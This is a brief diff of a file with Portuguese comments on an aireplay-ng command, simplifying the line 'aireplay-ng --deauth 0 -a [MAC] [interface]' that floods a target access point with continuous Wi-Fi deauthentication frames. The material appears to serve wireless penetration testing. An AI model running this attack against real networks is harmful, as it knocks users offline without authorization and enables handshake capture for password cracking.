@@ -4,4 +4,4 @@
 # -a [MAC] : MAC é o BSSID do alvo.
 # [interface] : Interface em modo de monitoramento.
 
-aireplay-ng --deauth 0 -a [MAC]	(opcional: -c MAC do cliente alvo) [interface]
+aireplay-ng --deauth 0 -a [MAC] [interface]
